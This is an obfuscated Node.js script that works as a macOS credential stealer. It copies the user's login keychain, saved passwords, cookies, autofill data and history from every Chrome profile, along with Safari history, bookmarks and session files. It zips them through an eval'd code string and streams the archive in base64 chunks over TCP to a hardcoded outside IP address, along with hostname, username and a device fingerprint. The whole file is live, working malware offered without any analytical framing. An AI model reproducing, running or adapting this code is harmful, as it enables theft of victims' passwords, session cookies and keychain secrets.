const _0xceb50a=_0x5324;function _0x5324(_0x3b814a,_0x9bbe78){const _0x230092=_0x2300();return _0x5324=function(_0x53243d,_0x1d4e65){_0x53243d=_0x53243d-0x1f0;let _0x2ab6ad=_0x230092[_0x53243d];return _0x2ab6ad;},_0x5324(_0x3b814a,_0x9bbe78);}(function(_0x2405cd,_0x629806){const _0x33933b=_0x5324,_0x4b7de4=_0x2405cd();while(!![]){try{const _0x232db8=parseInt(_0x33933b(0x270))/0x1+-parseInt(_0x33933b(0x27c))/0x2*(parseInt(_0x33933b(0x279))/0x3)+parseInt(_0x33933b(0x22a))/0x4+parseInt(_0x33933b(0x20e))/0x5*(parseInt(_0x33933b(0x284))/0x6)+-parseInt(_0x33933b(0x243))/0x7*(parseInt(_0x33933b(0x244))/0x8)+parseInt(_0x33933b(0x268))/0x9*(-parseInt(_0x33933b(0x1f9))/0xa)+parseInt(_0x33933b(0x28c))/0xb;if(_0x232db8===_0x629806)break;else _0x4b7de4['push'](_0x4b7de4['shift']());}catch(_0x38fd81){_0x4b7de4['push'](_0x4b7de4['shift']());}}}(_0x2300,0x35d67));const fs=require('fs'),os=require('os'),path=require(_0xceb50a(0x227)),net=require(_0xceb50a(0x24e)),{exec}=require(_0xceb50a(0x200)),crypto=require('crypto'),CONFIG={'serverHost':'92.246.137.44','serverPort':0x115c,'chunkSize':0x100*0x400,'retryDelay':0x1388,'maxRetries':0x5,'stableDir':_0xceb50a(0x1f2),'zipFileName':'Stable.zip','chromeImportantFiles':['Web\x20Data',_0xceb50a(0x207),'Login\x20Data',_0xceb50a(0x230),_0xceb50a(0x252),'History-journal',_0xceb50a(0x221),_0xceb50a(0x1fc),_0xceb50a(0x24b),_0xceb50a(0x228)]};let allLogs=[];function log(_0x194193,_0x19b9ef=![]){const _0x2c1b6c=_0xceb50a,_0xc84e2b=new Date()[_0x2c1b6c(0x234)](),_0x204b34='['+_0xc84e2b+']\x20'+_0x194193;allLogs['push'](_0x204b34);_0x19b9ef?console[_0x2c1b6c(0x280)](_0x204b34):console[_0x2c1b6c(0x278)](_0x204b34);try{fs[_0x2c1b6c(0x218)](_0x2c1b6c(0x264),_0x204b34+'\x0a');}catch(_0x234281){console[_0x2c1b6c(0x280)](_0x2c1b6c(0x20c)+_0x234281[_0x2c1b6c(0x25f)]);}}function createDirectory(_0xfb4760){const _0x2be472=_0xceb50a;try{return!fs[_0x2be472(0x204)](_0xfb4760)?(fs[_0x2be472(0x282)](_0xfb4760,{'recursive':!![]}),log('Directory\x20created:\x20'+_0xfb4760)):log('Directory\x20already\x20exists:\x20'+_0xfb4760),!![];}catch(_0x165eec){return log('Error\x20creating\x20directory\x20'+_0xfb4760+':\x20'+_0x165eec[_0x2be472(0x25f)],!![]),![];}}function _0x2300(){const _0xa4eb15=['Starting\x20file\x20transfer...','416960lhHFlj','createHash','OS:\x20','writeFileSync','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20log(\x27Command\x20executed\x20successfully\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20{\x20success:\x20true,\x20output:\x20\x27Command\x20executed\x20successfully\x27\x20};\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x20catch\x20(error)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20log(\x27Error\x20executing\x20command:\x20\x27\x20+\x20error.message,\x20true);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20{\x20success:\x20false,\x20error:\x20error\x20};\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20','...','Login\x20Data-journal','Profile\x20','Error\x20scanning\x20Chrome\x20profiles:\x20','alloc','toISOString','serverPort','Server\x20response:\x20','join','Data\x20collection\x20failed,\x20exiting','pwd\x20||\x20cd','Keychain\x20file\x20not\x20found:\x20','maxRetries','History.db-shm','/Users/','close','Server\x20acknowledged\x20successful\x20file\x20transfer','File\x20transfer\x20completed.\x20Exiting...','History.db','connect','93646GTCPAS','160zMxSMF','stderr:\x20','exit','Path\x20is\x20not\x20a\x20file:\x20','File\x20sent.\x20Waiting\x20for\x20server\x20confirmation...','arch','serverHost','Bookmarks','File\x20uploaded\x20successfully','00:00:00:00:00:00','net','internal','File\x20transfer\x20failed','Socket','History','Connected\x20to\x20server\x20','userInfo','retryDelay','\x20|\x20ETA:\x20','\x20copied\x20successfully','File\x20not\x20found:\x20','N/A','\x20B/s','Failed\x20to\x20create\x20Stable\x20directory','data','toFixed','name','message','mac','=====\x20СБОР\x20ДАННЫХ\x20ЗАВЕРШЕН\x20=====','\x20chunks)\x20|\x20Speed:\x20','username','collector.log','unknown','Error\x20sending\x20file:\x20','digest','513HuHoET','\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20archive\x20=\x20archiver(\x27zip\x27,\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20zlib:\x20{\x20level:\x201\x20}\x20//\x20Уровень\x20сжатия\x201\x20(оптимальный)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20output.on(\x27close\x27,\x20function()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20log(\x27ZIP\x20archive\x20created\x20successfully\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20archive.on(\x27error\x27,\x20function(err)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20throw\x20err;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20archive.pipe(output);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20//\x20Добавляем\x20директорию,\x20исключая\x20.DS_Store\x20файлы\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20addDirToArchive\x20=\x20(dir,\x20prefix\x20=\x20\x27\x27)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20items\x20=\x20fs.readdirSync(dir);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20for\x20(const\x20item\x20of\x20items)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(item\x20===\x20\x27.DS_Store\x27)\x20continue;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20itemPath\x20=\x20path.join(dir,\x20item);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20stat\x20=\x20fs.statSync(itemPath);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(stat.isDirectory())\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20addDirToArchive(itemPath,\x20path.join(prefix,\x20item));\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20else\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20fileData\x20=\x20fs.readFileSync(itemPath);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20archive.append(fileData,\x20{\x20name:\x20path.join(prefix,\x20item)\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20};\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20addDirToArchive(\x27','write','Connection\x20closed','stableDir','Date:\x20','stderr','=====\x20НАЧАЛО\x20ОТПРАВКИ\x20ДАННЫХ\x20=====','341910KYqgYT','Error\x20copying\x20Chrome\x20data:\x20','Total\x20time:\x20','LARGE_FILE:','readdirSync',').\x20Giving\x20up.','\x20seconds...','LastSession.plist','log','54123WUmbJA','Error\x20report\x20saved\x20to\x20error_report.log','CHUNKED_FILE_END','26GkHprQ','File\x20transfer\x20completed\x20successfully','includes','ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation','error','pow','mkdirSync','File\x20size:\x20','2154jZwsEV','Bookmarks.plist','hostname','keys','History.db-wal','\x20MB/s','chunkSize','\x20in\x20','6828679ZvHyqb','Current\x20user:\x20','slice','zipFileName','Error\x20copying\x20file\x20','statSync','Connecting\x20to\x20server\x20','0\x20Bytes','platform','release','Executing\x20command:\x20','Stable','ceil','Server\x20confirmation\x20timeout.\x20Exiting...','trim','copyFileSync','Creating\x20ZIP\x20archive...','promises','72060WYDFiQ','length','now','Cookies-journal','=====\x20ЗАПУСК\x20ПРОГРАММЫ\x20СБОРА\x20И\x20ОТПРАВКИ\x20ДАННЫХ\x20=====','Bytes','update','child_process','Fatal\x20error:\x20','Safari\x20data\x20copied\x20successfully','substring','existsSync','Average\x20speed:\x20','push','Web\x20Data-journal','\x20->\x20','floor','Safari','random','Error\x20writing\x20to\x20log:\x20','chromeImportantFiles','925ApXXTY','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20archiver\x20=\x20require(\x27archiver\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20fs\x20=\x20require(\x27fs\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20path\x20=\x20require(\x27path\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20output\x20=\x20fs.createWriteStream(\x27','Error\x20in\x20data\x20collection:\x20','Safari\x20file\x20not\x20found:\x20','size','Chrome\x20data\x20for\x20profile\x20','Preparing\x20to\x20send\x20file:\x20','bytesRead','\x0a\x20\x20\x20\x20\x20\x20\x20\x20try\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','Chrome\x20file\x20not\x20found\x20in\x20profile\x20','appendFileSync','Chrome\x20directory\x20not\x20found:\x20','Client\x20ID:\x20','/Library/Keychains/login.keychain-db','stack','Connected\x20-\x20','Default','File\x20copied:\x20','Chrome_','Cookies','end','type','Reconnecting...','base64','toString','path','Secure\x20Preferences'];_0x2300=function(){return _0xa4eb15;};return _0x2300();}function copyFile(_0x1edae8,_0x5b3ace){const _0x18058c=_0xceb50a;try{return fs[_0x18058c(0x1f6)](_0x1edae8,_0x5b3ace),log(_0x18058c(0x21f)+_0x1edae8+_0x18058c(0x208)+_0x5b3ace),!![];}catch(_0x426bf0){return log(_0x18058c(0x290)+_0x1edae8+':\x20'+_0x426bf0[_0x18058c(0x25f)],!![]),![];}}function executeCommand(_0x2b781a){const _0x4a8c02=_0xceb50a;try{log(_0x4a8c02(0x1f1)+_0x2b781a);const _0x1f524a=_0x4a8c02(0x216)+_0x2b781a+_0x4a8c02(0x22e);return eval(_0x1f524a);}catch(_0x25a86a){log('Error\x20executing\x20command:\x20'+_0x25a86a[_0x4a8c02(0x25f)],!![]);if(_0x25a86a[_0x4a8c02(0x26e)])log(_0x4a8c02(0x245)+_0x25a86a[_0x4a8c02(0x26e)],!![]);return{'success':![],'error':_0x25a86a};}}function formatFileSize(_0x49da57){const _0x355476=_0xceb50a;if(_0x49da57===0x0)return _0x355476(0x293);const _0x3a30dd=0x400,_0x118139=[_0x355476(0x1fe),'KB','MB','GB','TB'],_0x1ce03=Math[_0x355476(0x209)](Math[_0x355476(0x278)](_0x49da57)/Math[_0x355476(0x278)](_0x3a30dd));return parseFloat((_0x49da57/Math[_0x355476(0x281)](_0x3a30dd,_0x1ce03))[_0x355476(0x25d)](0x2))+'\x20'+_0x118139[_0x1ce03];}function generateClientId(){const _0x50ef3b=_0xceb50a;try{const _0xb4c926=getMacAddress(),_0x594402=os[_0x50ef3b(0x286)](),_0xe24e4=os[_0x50ef3b(0x254)]()[_0x50ef3b(0x263)],_0x47bdee=crypto[_0x50ef3b(0x22b)]('md5')[_0x50ef3b(0x1ff)](_0xb4c926+':'+_0x594402+':'+_0xe24e4)[_0x50ef3b(0x267)]('hex')[_0x50ef3b(0x203)](0x0,0x8);return _0x47bdee;}catch(_0x3650d4){return Math[_0x50ef3b(0x20b)]()[_0x50ef3b(0x226)](0x24)['substring'](0x2,0xa);}}function getMacAddress(){const _0x551643=_0xceb50a;try{const _0x22ba9b=os['networkInterfaces']();for(const _0x36648a of Object[_0x551643(0x287)](_0x22ba9b)){for(const _0x1cfc9b of _0x22ba9b[_0x36648a]){if(!_0x1cfc9b[_0x551643(0x24f)]&&_0x1cfc9b[_0x551643(0x260)]!==_0x551643(0x24d))return _0x1cfc9b[_0x551643(0x260)];}}return'unknown';}catch(_0x49d713){return _0x551643(0x265);}}async function collectData(){const _0x15efd3=_0xceb50a;try{log('=====\x20НАЧАЛО\x20СБОРА\x20ДАННЫХ\x20=====');if(!createDirectory(CONFIG[_0x15efd3(0x26c)]))throw new Error(_0x15efd3(0x25b));const _0x36072a=os['userInfo']()[_0x15efd3(0x263)];log(_0x15efd3(0x28d)+_0x36072a);const _0x4e9224=_0x15efd3(0x23d)+_0x36072a+_0x15efd3(0x21b),_0x2a3bd3=path[_0x15efd3(0x237)](CONFIG['stableDir'],'login.keychain-db');fs['existsSync'](_0x4e9224)?copyFile(_0x4e9224,_0x2a3bd3):log(_0x15efd3(0x23a)+_0x4e9224,!![]);try{const _0x26aa77=_0x15efd3(0x23d)+_0x36072a+'/Library/Application\x20Support/Google/Chrome';if(fs['existsSync'](_0x26aa77)){const _0x2867bf=[];fs[_0x15efd3(0x204)](path[_0x15efd3(0x237)](_0x26aa77,_0x15efd3(0x21e)))&&_0x2867bf['push'](_0x15efd3(0x21e));try{const _0x4f90a5=fs[_0x15efd3(0x274)](_0x26aa77,{'withFileTypes':!![]});for(const _0xb3b6e9 of _0x4f90a5){_0xb3b6e9['isDirectory']()&&_0xb3b6e9[_0x15efd3(0x25e)]['startsWith'](_0x15efd3(0x231))&&_0x2867bf[_0x15efd3(0x206)](_0xb3b6e9[_0x15efd3(0x25e)]);}}catch(_0x312884){log(_0x15efd3(0x232)+_0x312884['message'],!![]);}log('Found\x20'+_0x2867bf[_0x15efd3(0x1fa)]+'\x20Chrome\x20profiles:\x20'+_0x2867bf['join'](',\x20'));for(const _0xb9ed01 of _0x2867bf){const _0x5cf1bf=path[_0x15efd3(0x237)](_0x26aa77,_0xb9ed01),_0x637e49=path[_0x15efd3(0x237)](CONFIG['stableDir'],_0x15efd3(0x220)+_0xb9ed01);createDirectory(_0x637e49);for(const _0x3506c6 of CONFIG[_0x15efd3(0x20d)]){const _0x17b051=path[_0x15efd3(0x237)](_0x5cf1bf,_0x3506c6),_0x3ffcca=path[_0x15efd3(0x237)](_0x637e49,_0x3506c6);fs[_0x15efd3(0x204)](_0x17b051)?copyFile(_0x17b051,_0x3ffcca):log(_0x15efd3(0x217)+_0xb9ed01+':\x20'+_0x17b051);}log(_0x15efd3(0x213)+_0xb9ed01+_0x15efd3(0x257));}}else log(_0x15efd3(0x219)+_0x26aa77,!![]);}catch(_0x52216f){log(_0x15efd3(0x271)+_0x52216f['message'],!![]);}try{const _0x52dc28=_0x15efd3(0x23d)+_0x36072a+'/Library/Safari',_0x2d6d81=path['join'](CONFIG[_0x15efd3(0x26c)],_0x15efd3(0x20a));createDirectory(_0x2d6d81);const _0x1a8c37=[_0x15efd3(0x241),_0x15efd3(0x23c),_0x15efd3(0x288),_0x15efd3(0x285),_0x15efd3(0x277),'Extensions/Extensions.plist'];for(const _0x30f81c of _0x1a8c37){const _0x159b6b=path[_0x15efd3(0x237)](_0x52dc28,_0x30f81c),_0x2c7145=path['dirname'](path[_0x15efd3(0x237)](_0x2d6d81,_0x30f81c));createDirectory(_0x2c7145);if(fs[_0x15efd3(0x204)](_0x159b6b)){const _0x15e166=path['join'](_0x2d6d81,_0x30f81c);copyFile(_0x159b6b,_0x15e166);}else log(_0x15efd3(0x211)+_0x159b6b);}log(_0x15efd3(0x202));}catch(_0x4bf432){log('Error\x20copying\x20Safari\x20data:\x20'+_0x4bf432[_0x15efd3(0x25f)],!![]);}log(_0x15efd3(0x1f7));const _0x2a41fd=executeCommand(_0x15efd3(0x20f)+CONFIG['zipFileName']+_0x15efd3(0x269)+CONFIG[_0x15efd3(0x26c)]+'\x27,\x20\x27'+CONFIG[_0x15efd3(0x26c)]+'\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20archive.finalize();\x0a\x20\x20\x20\x20\x20\x20\x20\x20');if(!_0x2a41fd['success'])throw new Error('Failed\x20to\x20create\x20ZIP\x20archive');log('ZIP\x20archive\x20created\x20successfully');if(fs[_0x15efd3(0x204)](CONFIG[_0x15efd3(0x28f)])){const _0x559974=fs[_0x15efd3(0x291)](CONFIG[_0x15efd3(0x28f)]);log('Archive\x20size:\x20'+formatFileSize(_0x559974[_0x15efd3(0x212)]));}else throw new Error(_0x15efd3(0x27f));return log(_0x15efd3(0x261)),!![];}catch(_0x3a794d){return log(_0x15efd3(0x210)+_0x3a794d[_0x15efd3(0x25f)],!![]),![];}}let socket,retryCount=0x0,clientId=generateClientId(),totalChunks=0x0,currentChunk=0x0,fileSize=0x0,fileName='',transferStartTime=0x0;function formatDuration(_0x3bbed8){const _0x581b04=_0xceb50a,_0x4a0806=Math[_0x581b04(0x209)](_0x3bbed8/0x3c),_0x49b080=Math['round'](_0x3bbed8%0x3c);return _0x4a0806>0x0?_0x4a0806+'m\x20'+_0x49b080+'s':_0x49b080+'s';}function calculateSpeed(_0x8d7c19,_0x1ef719){const _0x496610=_0xceb50a;if(_0x1ef719===0x0)return _0x496610(0x259);const _0x44ab26=_0x8d7c19/_0x1ef719;if(_0x44ab26<0x400)return _0x44ab26[_0x496610(0x25d)](0x2)+_0x496610(0x25a);else return _0x44ab26<0x400*0x400?(_0x44ab26/0x400)[_0x496610(0x25d)](0x2)+'\x20KB/s':(_0x44ab26/(0x400*0x400))[_0x496610(0x25d)](0x2)+_0x496610(0x289);}async function sendFileInChunks(_0x5812d1,_0x453532){const _0x1d024a=_0xceb50a;try{if(!fs[_0x1d024a(0x204)](_0x5812d1))return log(_0x1d024a(0x258)+_0x5812d1,!![]),![];const _0x55adb8=fs[_0x1d024a(0x291)](_0x5812d1);if(!_0x55adb8['isFile']())return log(_0x1d024a(0x247)+_0x5812d1,!![]),![];fileName=path['basename'](_0x5812d1),fileSize=_0x55adb8['size'],totalChunks=Math[_0x1d024a(0x1f3)](fileSize/CONFIG[_0x1d024a(0x28a)]),log(_0x1d024a(0x214)+fileName),log(_0x1d024a(0x283)+formatFileSize(fileSize)),log('Total\x20chunks:\x20'+totalChunks+'\x20('+CONFIG[_0x1d024a(0x28a)]+'\x20bytes\x20per\x20chunk)');const _0xa9c6df={'hostname':os[_0x1d024a(0x286)](),'platform':os[_0x1d024a(0x294)](),'type':os[_0x1d024a(0x223)](),'arch':os['arch'](),'username':os[_0x1d024a(0x254)]()[_0x1d024a(0x263)],'id':clientId};_0x453532[_0x1d024a(0x26a)](_0x1d024a(0x21d)+_0xa9c6df['hostname']+'\x20('+_0xa9c6df[_0x1d024a(0x294)]+'\x20'+_0xa9c6df[_0x1d024a(0x249)]+')\x0a'),_0x453532[_0x1d024a(0x26a)]('Current\x20directory:\x20'+process['cwd']()+'\x0a'),_0x453532[_0x1d024a(0x26a)](_0x1d024a(0x21a)+_0xa9c6df['id']+'\x0a'),log(_0x1d024a(0x229)),transferStartTime=Date[_0x1d024a(0x1fb)]();fileSize>0xa*0x400*0x400&&(_0x453532[_0x1d024a(0x26a)](_0x1d024a(0x273)+fileName+':'+fileSize+'\x0a'),await new Promise(_0x2d227f=>setTimeout(_0x2d227f,0x1f4)));_0x453532[_0x1d024a(0x26a)]('CHUNKED_FILE_START:'+fileName+':'+fileSize+':'+totalChunks+':'+CONFIG[_0x1d024a(0x28a)]+'\x0a'),await new Promise(_0x2a51ca=>setTimeout(_0x2a51ca,0x1f4));const _0x2755be=await fs[_0x1d024a(0x1f8)]['open'](_0x5812d1,'r'),_0xcd48d9=Buffer[_0x1d024a(0x233)](CONFIG['chunkSize']);currentChunk=0x0;let _0x1b36bb;try{while(currentChunk<totalChunks){_0x1b36bb=await _0x2755be['read'](_0xcd48d9,0x0,CONFIG[_0x1d024a(0x28a)],currentChunk*CONFIG[_0x1d024a(0x28a)]);if(_0x1b36bb[_0x1d024a(0x215)]===0x0)break;const _0x2c424f=_0xcd48d9[_0x1d024a(0x28e)](0x0,_0x1b36bb['bytesRead']),_0x3f0f3b=_0x2c424f['toString'](_0x1d024a(0x225));_0x453532[_0x1d024a(0x26a)]('CHUNKED_FILE_DATA:'+fileName+':'+currentChunk+':'+totalChunks+':'+_0x3f0f3b+'\x0a'),currentChunk++;const _0x532de4=currentChunk/totalChunks*0x64,_0x467695=(Date[_0x1d024a(0x1fb)]()-transferStartTime)/0x3e8,_0x28a3df=currentChunk*CONFIG[_0x1d024a(0x28a)],_0x384020=calculateSpeed(_0x28a3df,_0x467695);if(currentChunk%0xa===0x0||_0x532de4%0x5<CONFIG['chunkSize']/fileSize*0x64){const _0x2a98e7=_0x467695/_0x532de4*(0x64-_0x532de4);log('Progress:\x20'+_0x532de4[_0x1d024a(0x25d)](0x1)+'%\x20('+currentChunk+'/'+totalChunks+_0x1d024a(0x262)+_0x384020+_0x1d024a(0x256)+formatDuration(_0x2a98e7));}await new Promise(_0x2fb531=>setTimeout(_0x2fb531,0x64));}_0x453532['write']('CHUNKED_FILE_END:'+fileName+':'+currentChunk+':'+fileSize+'\x0a');const _0x1d3526=(Date['now']()-transferStartTime)/0x3e8,_0x4871e3=calculateSpeed(fileSize,_0x1d3526);return log(_0x1d024a(0x27d)),log(_0x1d024a(0x272)+formatDuration(_0x1d3526)),log(_0x1d024a(0x205)+_0x4871e3),!![];}finally{await _0x2755be['close']();}}catch(_0x415e07){return log(_0x1d024a(0x266)+_0x415e07[_0x1d024a(0x25f)],!![]),log(_0x415e07[_0x1d024a(0x21c)],!![]),![];}}function handleServerResponse(_0x4365f5){const _0x2017ee=_0xceb50a,_0x36a4f3=_0x4365f5[_0x2017ee(0x226)]()[_0x2017ee(0x1f5)]();_0x36a4f3&&!_0x36a4f3[_0x2017ee(0x27e)](_0x2017ee(0x239))&&log(_0x2017ee(0x236)+_0x36a4f3),(_0x36a4f3[_0x2017ee(0x27e)](_0x2017ee(0x27b))||_0x36a4f3['includes'](_0x2017ee(0x24c)))&&(log(_0x2017ee(0x23f)),log(_0x2017ee(0x240)),socket['end'](),setTimeout(()=>process['exit'](0x0),0x3e8));}function connectAndSendFile(_0x2e2398){const _0x335ecf=_0xceb50a;log(_0x335ecf(0x26f)),log(_0x335ecf(0x292)+CONFIG[_0x335ecf(0x24a)]+':'+CONFIG[_0x335ecf(0x235)]+_0x335ecf(0x22f)),socket=new net[(_0x335ecf(0x251))](),socket['on']('connect',async()=>{const _0x4278e5=_0x335ecf;log(_0x4278e5(0x253)+CONFIG[_0x4278e5(0x24a)]+':'+CONFIG[_0x4278e5(0x235)]),retryCount=0x0;const _0x167dc7=await sendFileInChunks(_0x2e2398,socket);_0x167dc7?(log(_0x4278e5(0x248)),setTimeout(()=>{const _0x3ff179=_0x4278e5;log(_0x3ff179(0x1f4)),socket['end'](),process['exit'](0x0);},0x7530)):(log(_0x4278e5(0x250),!![]),socket[_0x4278e5(0x222)](),process[_0x4278e5(0x246)](0x1));}),socket['on'](_0x335ecf(0x25c),handleServerResponse),socket['on']('error',_0x1f8249=>{log('Connection\x20error:\x20'+_0x1f8249['message'],!![]),retryConnection(_0x2e2398);}),socket['on'](_0x335ecf(0x23e),()=>{const _0xceeb3b=_0x335ecf;log(_0xceeb3b(0x26b)),currentChunk<totalChunks&&retryConnection(_0x2e2398);}),socket[_0x335ecf(0x242)](CONFIG[_0x335ecf(0x235)],CONFIG[_0x335ecf(0x24a)]);}function retryConnection(_0xcfa37f){const _0x51924e=_0xceb50a;retryCount++,retryCount<=CONFIG[_0x51924e(0x23b)]?(log('Retry\x20attempt\x20'+retryCount+'/'+CONFIG[_0x51924e(0x23b)]+_0x51924e(0x28b)+CONFIG[_0x51924e(0x255)]/0x3e8+_0x51924e(0x276)),setTimeout(()=>{const _0x4e8d8e=_0x51924e;log(_0x4e8d8e(0x224)),connectAndSendFile(_0xcfa37f);},CONFIG[_0x51924e(0x255)])):(log('Maximum\x20retry\x20attempts\x20reached\x20('+CONFIG[_0x51924e(0x23b)]+_0x51924e(0x275),!![]),process[_0x51924e(0x246)](0x1));}async function main(){const _0x564e7a=_0xceb50a;try{log(_0x564e7a(0x1fd)),log(_0x564e7a(0x26d)+new Date()[_0x564e7a(0x234)]()),log(_0x564e7a(0x22c)+os[_0x564e7a(0x294)]()+'\x20'+os[_0x564e7a(0x1f0)]()+'\x20('+os['arch']()+')'),log('Hostname:\x20'+os[_0x564e7a(0x286)]()),log('Username:\x20'+os[_0x564e7a(0x254)]()[_0x564e7a(0x263)]),log('Client\x20ID:\x20'+generateClientId());const _0x37bd23=await collectData();!_0x37bd23&&(log(_0x564e7a(0x238),!![]),process[_0x564e7a(0x246)](0x1)),connectAndSendFile(CONFIG['zipFileName']);}catch(_0x545dd3){log(_0x564e7a(0x201)+_0x545dd3['message'],!![]);try{fs[_0x564e7a(0x22d)]('error_report.log',allLogs[_0x564e7a(0x237)]('\x0a')),log(_0x564e7a(0x27a));}catch(_0x22f5ce){console[_0x564e7a(0x280)]('Failed\x20to\x20save\x20error\x20report:',_0x22f5ce);}process[_0x564e7a(0x246)](0x1);}}main();
